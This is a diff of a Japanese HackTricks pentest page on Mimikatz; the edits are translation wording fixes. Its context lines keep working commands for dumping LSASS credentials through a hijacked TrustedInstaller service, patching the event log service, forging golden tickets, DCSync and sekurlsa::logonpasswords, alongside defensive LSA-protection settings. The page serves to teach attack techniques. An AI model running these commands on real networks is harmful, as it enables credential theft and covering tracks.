@@ -30,7 +30,7 @@ Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を�
 
 - **LM ハッシュと平文パスワード**は、セキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。
 
-- **LSA 保護**は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることによって実現されます。LSA 保護を有効にするには：
+- **LSA 保護**は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることで実現されます。LSA 保護を有効にするには：
 1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ のレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
 2. 管理されたデバイス全体でこのレジストリ変更を強制するグループ ポリシー オブジェクト (GPO) を実装します。
 
@@ -38,7 +38,7 @@ Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を�
 
 ### SeDebugPrivilege 削除への対抗
 
-管理者は通常 SeDebugPrivilege を持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあり、これは攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます：
+管理者は通常、プログラムをデバッグするための SeDebugPrivilege を持っています。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -51,12 +51,12 @@ sc start TrustedInstaller
 ```
 ## Mimikatz Options
 
-Mimikatzにおけるイベントログの改ざんは、主に2つのアクションを含みます：イベントログのクリアと新しいイベントのログ記録を防ぐためのイベントサービスのパッチ。以下は、これらのアクションを実行するためのコマンドです：
+Mimikatzにおけるイベントログの改ざんは、主に2つのアクションを含みます：イベントログのクリアと新しいイベントのログ記録を防ぐためのイベントサービスのパッチ適用。以下はこれらのアクションを実行するためのコマンドです：
 
 #### Clearing Event Logs
 
-- **Command**: このアクションは、イベントログを削除することを目的としており、悪意のある活動を追跡することを難しくします。
-- Mimikatzは、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準ドキュメントに提供していません。しかし、イベントログの操作は通常、特定のログをクリアするためにMimikatzの外部でシステムツールやスクリプトを使用することを含みます（例：PowerShellやWindows Event Viewerを使用）。
+- **Command**: このアクションはイベントログを削除することを目的としており、悪意のある活動を追跡することを難しくします。
+- Mimikatzは、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準のドキュメントには提供していません。しかし、イベントログの操作は通常、特定のログをクリアするためにMimikatzの外部でシステムツールやスクリプトを使用することを含みます（例：PowerShellやWindows Event Viewerを使用）。
 
 #### Experimental Feature: Patching the Event Service
 
@@ -65,14 +65,14 @@ Mimikatzにおけるイベントログの改ざんは、主に2つのアクシ�
 - Example: `mimikatz "privilege::debug" "event::drop" exit`
 
 - `privilege::debug`コマンドは、Mimikatzがシステムサービスを変更するために必要な特権で動作することを保証します。
-- 次に、`event::drop`コマンドがイベントログサービスをパッチします。
+- 次に、`event::drop`コマンドがイベントログサービスにパッチを適用します。
 
 
 ### Kerberos Ticket Attacks
 
 ### Golden Ticket Creation
 
-ゴールデンチケットは、ドメイン全体のアクセスのなりすましを可能にします。主なコマンドとパラメータ：
+ゴールデンチケットは、ドメイン全体へのアクセスのなりすましを可能にします。主なコマンドとパラメータ：
 
 - Command: `kerberos::golden`
 - Parameters:
@@ -134,6 +134,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - セッションからすべてのKerberosチケットをクリアします。
 - チケット操作コマンドを使用する前に、競合を避けるために便利です。
 
+
 ### Active Directoryの改ざん
 
 - **DCShadow**: ADオブジェクト操作のために一時的にマシンをDCとして機能させます。
@@ -142,9 +143,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **DCSync**: DCを模倣してパスワードデータを要求します。
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### 資格情報アクセス
+### 認証情報アクセス
 
-- **LSADUMP::LSA**: LSAから資格情報を抽出します。
+- **LSADUMP::LSA**: LSAから認証情報を抽出します。
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: コンピュータアカウントのパスワードデータを使用してDCを偽装します。
@@ -175,9 +176,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: デバッグ権限を取得します。
 - `mimikatz "privilege::debug" exit`
 
-### 資格情報ダンプ
+### 認証情報ダンプ
 
-- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの資格情報を表示します。
+- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの認証情報を表示します。
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
 - **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
@@ -221,8 +222,8 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
